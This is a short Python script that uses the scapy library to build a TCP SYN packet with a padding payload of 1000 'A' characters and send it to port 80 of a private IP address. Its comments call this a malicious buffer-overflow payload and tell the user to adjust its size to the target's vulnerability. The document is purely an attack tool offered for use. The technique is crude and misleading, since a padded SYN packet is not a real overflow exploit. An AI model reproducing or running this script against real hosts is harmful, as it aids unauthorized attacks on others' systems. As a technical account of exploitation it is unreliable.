from scapy.all import *

# Craft a malicious payload with a buffer overflow
payload = "A" * 1000  # Modify the number of "A" characters as per your target's vulnerability

# Craft the IP packet
ip_packet = IP(dst="192.168.178.81")

# Craft the TCP packet with the malicious payload
tcp_packet = TCP(sport=1234, dport=80, flags="S", seq=12345, ack=1000) / payload

# Send the packet
send(ip_packet / tcp_packet)

